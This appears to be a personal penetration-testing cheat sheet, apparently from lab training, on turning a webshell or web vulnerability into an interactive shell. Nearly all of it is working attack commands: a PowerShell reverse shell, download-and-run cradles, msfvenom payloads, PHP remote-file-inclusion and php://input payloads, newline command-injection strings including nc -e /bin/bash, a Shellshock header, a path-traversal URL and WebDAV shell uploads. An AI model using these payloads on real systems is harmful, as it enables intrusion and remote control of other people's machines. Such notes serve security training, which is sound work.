---
description: nc -nlvp 4444
---

# Webshell to stable shell

{% embed url="https://www.revshells.com/" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/command-injection" %}

### `rev.ps`

{% code overflow="wrap" %}
```powershell
#rev-shell.ps
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.184",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#feed
python -m http.server 8080
```
{% endcode %}

{% code overflow="wrap" %}
```
#setup listener
nc -nvlp 443

#run webshell command
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.132:8080/rev.ps1')"

or

echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.119.129/rev.ps1") | powershell -noprofile
```
{% endcode %}

### PHP for RFI

{% code overflow="wrap" %}
```
msfvenom -p linux/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.119.138 -f elf -o k  

python -m http.server 80

/rev.php
<?php shell_exec("curl http://192.168.119.138/k > /tmp/k;chmod +x /tmp/k; /tmp/k");?>

http://10.11.1.35/section.php?page=http://192.168.119.138/rev.php
```
{% endcode %}

### PHP file inclusion

{% code overflow="wrap" %}
```

curl -s --data "<?php system('bash -i >& /dev/tcp/192.168.119.136/4444 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=php://input%00"

or shell_exec
```
{% endcode %}

### Modify request to limitation bypass `%0a`

{% code overflow="wrap" %}
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php

vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80

vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay

ip=127.0.0.1 %0a wget 192.168.119.148 %0a mv index.html rev.php %0a php rev.php&send=Ping+It%21
(cannot use - / symbols, so wget index.html disguised rev shell)
```
{% endcode %}

### Executing cgi / pearl reverse shell with RFI

<pre data-overflow="wrap"><code><strong>#after uploading the rev file (copy from kali webshells)
</strong><strong>http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/var/tmp/rev.cgi
</strong></code></pre>

### Shellshock

{% code overflow="wrap" %}
```
curl -H "Cookie: () { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.119.125/4444 0>&1 &" http://10.11.1.71/cgi-bin/admin.cgi -s
```
{% endcode %}

### WebDav observed from nikto

{% code overflow="wrap" %}
```
curl -T '/home/kali/shell.aspx' 'http://192.168.64.122/' -u user:pw

cadaver ip
```
{% endcode %}

#### Curl upload&#x20;

```

curl -T './tmp/file' 'http://192.168.64.122/'
curl -X PUT http://192.168.52.42:8080/shell.jsp/ -d @- < shell.jsp
```

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav" %}
